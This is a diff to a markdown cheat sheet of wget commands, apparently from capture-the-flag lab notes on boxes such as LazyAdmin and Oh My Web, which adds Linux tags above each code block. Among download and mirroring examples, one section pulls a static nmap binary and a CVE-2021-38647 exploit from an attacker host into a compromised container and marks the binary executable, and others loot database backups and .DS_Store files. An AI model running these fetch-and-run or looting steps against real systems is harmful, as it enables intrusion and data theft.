@@ -7,6 +7,7 @@ Used on: **LazyAdmin**, **Yueiua**, **Oh My Web**, **Vulnversity**, **BSides GT 
 ## Commands Used
 
 ### Single-file download
+<!-- cmd: linux -->
 ```bash
 wget http://$TARGET/content/inc/cache/cache.db                         # [USED â€” LazyAdmin]
 wget http://$TARGET/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql   # [USED â€” LazyAdmin]
@@ -17,6 +18,7 @@ wget http://$TARGET/assets/images/oneforall.jpg                        # [USED â
 ```
 
 ### Drop a static binary into a stripped container (when curl is missing)
+<!-- cmd: linux -->
 ```bash
 wget http://$LHOST/nmap -O /tmp/nmap && chmod +x /tmp/nmap             # [USED â€” ohmyweb]
 wget http://$LHOST/CVE-2021-38647.py -O /tmp/exploit.py                # [USED â€” ohmyweb]
@@ -24,6 +26,7 @@ wget http://$LHOST/CVE-2021-38647.py -O /tmp/exploit.py                # [USED â
 Companion to the static-binary pivot: see [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md).
 
 ### `.DS_Store` bulk loot
+<!-- cmd: linux -->
 ```bash
 mkdir ds_store && cd ds_store
 wget http://$TARGET/.DS_Store
@@ -35,17 +38,20 @@ wget http://$TARGET/assets/images/shape/.DS_Store                      # [USED â
 Parse offline with `python3 -m ds_store <file>` â€” see [ds-store-disclosure.md](../../exploits/web-disclosure/ds-store-disclosure.md).
 
 ### Rename on save
+<!-- cmd: linux -->
 ```bash
 wget -O shell.php http://$TARGET/path/to/remote.php
 ```
 
 ### Preserve full directory layout
+<!-- cmd: linux -->
 ```bash
 wget -x http://$TARGET/content/inc/cache/cache.db
 #  creates ./<TARGET>/content/inc/cache/cache.db
 ```
 
 ### Recursive mirror (when feroxbuster gave a tree)
+<!-- cmd: linux -->
 ```bash
 wget -r -np -nH --cut-dirs=1 http://$TARGET/backups/
 ```
@@ -57,26 +63,31 @@ wget -r -np -nH --cut-dirs=1 http://$TARGET/backups/
 | `--cut-dirs=N` | strip N leading directories |
 
 ### Silence output (useful in scripts)
+<!-- cmd: linux -->
 ```bash
 wget -q http://$TARGET/file -O file
 ```
 
 ### POST request
+<!-- cmd: linux -->
 ```bash
 wget --method=POST --body-data='foo=bar' http://$TARGET/endpoint
 ```
 
 ### Ignore TLS errors (self-signed certs)
+<!-- cmd: linux -->
 ```bash
 wget --no-check-certificate https://$TARGET/file
 ```
 
 ### Batch from a URL list
+<!-- cmd: linux -->
 ```bash
 wget -i urls.txt
 ```
 
 ### Background / resumable downloads
+<!-- cmd: linux -->
 ```bash
 wget -c http://$TARGET/big.iso         # resume partial
 wget -b http://$TARGET/big.iso         # run in background
